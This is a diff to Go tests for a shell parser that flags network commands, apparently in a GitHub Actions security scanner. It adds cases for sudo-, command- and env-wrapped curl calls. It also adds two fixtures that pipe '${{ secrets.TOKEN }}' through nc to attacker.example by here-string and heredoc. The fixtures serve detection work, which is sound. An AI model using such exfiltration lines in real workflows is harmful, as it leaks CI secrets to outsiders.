@@ -604,6 +604,24 @@ func TestShellParser_FindNetworkCommands(t *testing.T) {
 			wantCount:    1,
 			wantCmdNames: []string{"host"},
 		},
+		{
+			name:         "sudo wrapped curl command",
+			script:       `sudo curl https://example.com`,
+			wantCount:    1,
+			wantCmdNames: []string{"curl"},
+		},
+		{
+			name:         "command wrapped curl command",
+			script:       `command curl https://example.com`,
+			wantCount:    1,
+			wantCmdNames: []string{"curl"},
+		},
+		{
+			name:         "env wrapped curl command",
+			script:       `env FOO=bar curl https://example.com`,
+			wantCount:    1,
+			wantCmdNames: []string{"curl"},
+		},
 	}
 
 	for _, tt := range tests {
@@ -742,6 +760,55 @@ func TestShellParser_FindNetworkCommandsPipeInputsNoLeakage(t *testing.T) {
 	}
 	if len(calls[1].PipeInputs) != 0 {
 		t.Fatalf("len(calls[1].PipeInputs) = %d, want 0", len(calls[1].PipeInputs))
+	}
+}
+
+func TestShellParser_FindNetworkCommandsStdinInputs(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name      string
+		script    string
+		wantExpr  string
+		wantCount int
+	}{
+		{
+			name:      "here string",
+			script:    `nc attacker.example 443 <<< '${{ secrets.TOKEN }}'`,
+			wantExpr:  "secrets.TOKEN",
+			wantCount: 1,
+		},
+		{
+			name: "heredoc",
+			script: `nc attacker.example 443 <<'EOF'
+${{ secrets.TOKEN }}
+EOF`,
+			wantExpr:  "secrets.TOKEN",
+			wantCount: 1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			parser := NewShellParser(tt.script)
+			calls := parser.FindNetworkCommands()
+
+			if len(calls) != 1 {
+				t.Fatalf("got %d network commands, want 1", len(calls))
+			}
+			if calls[0].CommandName != "nc" {
+				t.Fatalf("CommandName = %q, want %q", calls[0].CommandName, "nc")
+			}
+			if len(calls[0].StdinInputs) != tt.wantCount {
+				t.Fatalf("len(StdinInputs) = %d, want %d", len(calls[0].StdinInputs), tt.wantCount)
+			}
+			gotExprs := findGHAExprs(calls[0].StdinInputs)
+			if len(gotExprs) != 1 || gotExprs[0] != tt.wantExpr {
+				t.Fatalf("StdinInputs GHAExprs = %#v, want []string{%q}", gotExprs, tt.wantExpr)
+			}
+		})
 	}
 }
 
